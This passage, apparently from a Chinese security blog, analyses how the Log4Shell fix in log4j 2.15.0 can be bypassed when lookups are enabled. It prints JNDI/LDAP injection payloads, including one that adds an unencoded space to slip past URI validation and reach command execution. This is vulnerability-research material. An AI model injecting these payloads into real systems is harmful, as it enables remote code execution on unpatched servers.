&lt;module&gt;log4j-slf4j18-impl&lt;/module&gt; &lt;module&gt;log4j-to-slf4j&lt;/module&gt; &lt;module&gt;log4j-jcl&lt;/module&gt; &lt;module&gt;log4j-flume-ng&lt;/module&gt; &lt;module&gt;log4j-taglib&lt;/module&gt; &lt;module&gt;log4j-jmx-gui&lt;/module&gt; &lt;module&gt;log4j-samples&lt;/module&gt; &lt;module&gt;log4j-bom&lt;/module&gt; &lt;module&gt;log4j-jdbc-dbcp2&lt;/module&gt; &lt;module&gt;log4j-jpa&lt;/module&gt; &lt;module&gt;log4j-couchdb&lt;/module&gt; &lt;module&gt;log4j-mongodb3&lt;/module&gt; &lt;module&gt;log4j-mongodb4&lt;/module&gt; &lt;module&gt;log4j-cassandra&lt;/module&gt; &lt;module&gt;log4j-web&lt;/module&gt; &lt;module&gt;log4j-jakarta-web&lt;/module&gt; &lt;module&gt;log4j-perf&lt;/module&gt; &lt;module&gt;log4j-iostreams&lt;/module&gt; &lt;module&gt;log4j-jul&lt;/module&gt; &lt;module&gt;log4j-jpl&lt;/module&gt; &lt;module&gt;log4j-liquibase&lt;/module&gt; &lt;module&gt;log4j-appserver&lt;/module&gt; &lt;module&gt;log4j-osgi&lt;/module&gt; &lt;module&gt;log4j-docker&lt;/module&gt; &lt;module&gt;log4j-kubernetes&lt;/module&gt; &lt;module&gt;log4j-spring-boot&lt;/module&gt; &lt;module&gt;log4j-spring-cloud-config&lt;/module&gt; --&gt;&lt;/modules&gt; 使用如下mvn指令编译 -t toolchains-sample-mac.xml 指定toolchains文件 -Dmaven.test.skip=true 跳过测试 -Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=1099 使用代理加速 12# JAVA_HOME设置为jdk1.8./mvnw clean install -t toolchains-sample-mac.xml -Dmaven.test.skip=true -Dhttp.proxyHost=127.0.0.1 -Dhttp.proxyPort=1099 编译完成后生成的artifact(jar包)在各个module的target文件夹中 利用链分析在pom.xml修改log4j-core版本为2.15.0，然后将编译出来的jar包全部替换进去 由于2.15.0版本中默认禁用了LookUp，我们首先需要通过配置将其打开 修改log4j2.xml配置 12345678910111213&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;Configuration&gt; &lt;Appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt; &lt;PatternLayout pattern=&quot;[%t] %-5level %m{lookups} %n&quot;/&gt; &lt;/Console&gt; &lt;/Appenders&gt; &lt;Loggers&gt; &lt;Root level=&quot;info&quot;&gt; &lt;AppenderRef ref=&quot;Console&quot;/&gt; &lt;/Root&gt; &lt;/Loggers&gt;&lt;/Configuration&gt; 此时，Payload如下可以被解析 1${sys:java.version} 但是JNDI Payload不会被解析 1${jndi:ldap://ip:1389/#Exploit} 由于我们知道现在${}还是会解析，但是jndi受限制，所以根据之前的分析，我们前往StrSubstitutor.resolveVariable()看看变量解析的工作流程 进入lookup() 我们可以发现JNDI其实还是可以解析的，再进入一层lookup，观察JNDI内部受到了什么限制 继续进入jndiManager的lookup 可以发现，首先使用了一些协议和来源地址的限制 来源地址可以发现是本机的一些IP，此时假设来源地址的限制也不影响我们，我们也是在本地做测试，并且ldap也在允许的协议中 可以发现此处禁止了引用对象的使用，检查方法是attributeMap.get(OBJECT_FACTORY)!=null 除此之外，还限制了JNDI的另一种利用方式——反序列化，其通过allowedClasses将可以反序列化的类型限制在了Java的几个基本类型 虽然局部看起来很完美，但是代码的异常捕捉逻辑有问题，可以看到如下 如果出现URI语法错误，就可以直接触发异常处理并进入lookup，那要如何让URI出错又能正常lookup呢？ 只需往URI中加一个无URL编码的空格即可，lookup的时候会忽略这个空格，我们把payload改为 1${jndi:ldap://127.0.0.1:1389/# Exploit} 可以发现成功触发命令执行 绕过总结此处绕过的条件较为苛刻，必须满足如下两个条件 开发者主动开启lookups功能 LDAP来源地址必须在白名单中，而默认白名单为本机地址 参考 Log4j Vulnerability (Log4Shell) Explained // CVE-2021-44228 - YouTube https://logging.apache.org/log4j/2.x/changes-report.html log4j2 漏洞分析与思考 (seebug.org) Apache Log4j2 远程代码执行漏洞分析 - 安全客，安全资讯平台 (anquanke.com) Log4j – Configuring Log4j 2 (apache.org) Apache Log4j2从RCE到RC1绕过 - 先知社区 (aliyun.com) JNDI with LDAP - 安全客，安全资讯平台 (anquanke.com) Serializable Objects (oracle.com) Referenceable Objects and References (oracle.com) 跟风蹭热度编译个logging-log4j2包-jdk11 (icode9.com)","link":"/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-44228-log4j2-RCE-%E5%88%86%E6%9E%90/"}],"tags":[{"name":"Tomcat","slug":"Tomcat","link":"/tags/Tomcat/"},{"name":"JNDI","slug":"JNDI","link":"/tags/JNDI/"},{"name":"Java Web","slug":"Java-Web","link":"/tags/Java-Web/"},{"name":"PWN","slug":"PWN","link":"/tags/PWN/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"环境","slug":"环境","link":"/tags/%E7%8E%AF%E5%A2%83/"},{"name":"内存马","slug":"内存马","link":"/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"},{"name":"Shell","slug":"Shell","link":"/tags/Shell/"},{"name":"ysoserial","slug":"ysoserial","link":"/tags/ysoserial/"},{"name":"Java Agent","slug":"Java-Agent","link":"/tags/Java-Agent/"},{"name":"恶意代码检测与隐藏","slug":"恶意代码检测与隐藏","link":"/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8F/"},{"name":"CVE","slug":"CVE","link":"/tags/CVE/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"CodeQL","slug":"CodeQL","link":"/tags/CodeQL/"},{"name":"C&amp;C++","slug":"C-C","link":"/tags/C-C/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"提权","slug":"提权","link":"/tags/%E6%8F%90%E6%9D%83/"},{"name":"格式化字符串","slug":"格式化字符串","link":"/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"}],"categories":[{"name":"Exploit","slug":"Exploit","link":"/categories/Exploit/"},{"name":"文档","slug":"文档","link":"/categories/%E6%96%87%E6%A1%A3/"},{"name":"技术归纳","slug":"技术归纳","link":"/categories/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/"},{"name":"漏洞分析","slug":"漏洞分析","link":"/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}]}